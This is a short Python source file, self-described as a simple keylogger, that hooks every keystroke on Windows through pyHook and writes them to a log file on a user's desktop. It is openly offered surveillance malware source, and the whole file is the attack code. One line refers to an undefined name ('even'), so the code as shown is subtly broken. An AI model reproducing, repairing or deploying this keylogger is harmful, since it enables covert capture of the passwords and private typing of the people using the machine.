# This is a simple python key logger
# Github xDarkicex
import pyHook, pythoncom, sys, logging
file_log = 'c:\\Users\\Gentr\\Desktop\\log.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(even.Ascii)
	logging.log(10,chr(event.Ascii))
	return True
hooks_manager = pyHook.HookManager()	
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
